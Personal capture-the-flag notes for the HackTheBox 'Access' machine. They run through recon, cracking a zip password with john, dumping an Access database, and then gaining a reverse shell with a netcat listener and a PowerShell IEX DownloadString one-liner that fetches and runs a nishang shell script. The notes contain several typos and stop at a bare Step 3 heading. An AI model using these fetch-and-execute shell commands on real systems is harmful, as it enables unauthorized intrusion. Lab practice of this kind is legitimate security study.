# HTB Access 
credit https://www.youtube.com/watch?v=Rr6Oxrj2IjU&t=1204s

## Step 1 Recon

  #### environment info gethering 
1. namp -sC -sV -oA namp/access <ip address>
2. wget -m --no-passive ftp://anonymoux:anonymous@<ip address>
3. Check http://<ip address>/robet.txt
4. Looks for existing or hidden web objects
gobuster -u http://<ip address> -w /usr/share/wordlists/seclists/discovery/web_content/<check yourself>
  
  #### File handling
5. unzip/7z to decompress a zip file
6. exiftool out.jpg
7. strings out.jpg
8. file backup.mdb
  
  #### Tools
9. apt search mdbtools
10. apt-get install <package>

* mdb-array
* mdb-export
* mdb-header
* mdb-hexdump
* mdb-parsecvs
* mdb-prop
* mdb-schema
* mdb-sql
* mdb-tables
* mdb-ver

#### Encripted file handling
9. 7z l -slt encriptedFile.zip
10. zip2john encriptedFile.zip > encriptedFile.hash
11. strings -n 8 backup.mdb | sort -u > possibleWordList
12. guess the password using the backup.mdd wordlist
john encriptedFile.hash --wordlist=possibleWordList -- show

#### MDB handling
13. mdb-sql backup.mdb

    |-list tables [list out all tables name in console]
    
    |-go
14. Export all table stored at the backup.mdb
    
    for i in $(mdb-tables backup.mdb);do mdb-export backup.mdb $i>tables/$i; done
15. Counting the exported tables by line 
  
    wc -l * | sort -n
    
    
## Step 2 Gain Access

#### Preparing reverse tcp shell for windows
-----------------------------
##### Kali
1) using this script /opt/nishang/shells/invoke-PowerShellTcp.ps1
Change the reverse address 
https://github.com/samratashok/nishang

2) startup web server

python -m SimpleHTTPServer

3) nc -lvnp 9001

##### Target Windows
4) powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://<ip address>/invoke-PowerShellTcp.ps1')


## Step 3 Getting target server information

### Checking windows environment JAWS
